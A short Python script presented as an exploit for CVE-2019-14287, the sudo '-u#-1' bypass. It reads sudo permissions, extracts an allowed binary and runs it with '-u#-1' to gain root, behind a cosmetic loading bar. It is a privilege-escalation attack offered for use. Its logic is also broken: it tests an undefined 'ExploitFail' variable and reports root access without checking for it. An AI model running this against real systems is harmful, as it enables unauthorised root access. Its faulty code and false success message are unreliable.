#!/usr/bin/python3

import os
import time

print("-------------------------------")
print(" # CVE : 2019-14287 Exploit # ")
print("-------------------------------\n")
username = input("Enter current username : ")
print(f"*** Starting The Sudo Security Bypass Exploitation for User {username} !!!")

time.sleep(2)
def loading_bar(duration):
    bar_width = 50
    increment = duration / bar_width
    
    print("Trying to Exploit ... ...")
    for _ in range(bar_width):
        print("-", end="", flush=True)
        time.sleep(increment)
    
    print(" (done!!!)")

loading_bar(5)  # Example: 5 seconds

os.system("sudo -l > priv")
os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
binary_file = open("binary")
binary= binary_file.read()
os.system("sudo -u#-1 "+ binary + " | grep 'unknown user #-1' > ExploitFail")
if "unknown user" in ExploitFail:
    print("This is Not vulnerable :(")
else:
    print("You Sucessfully gain the ROOT acesss !!!")

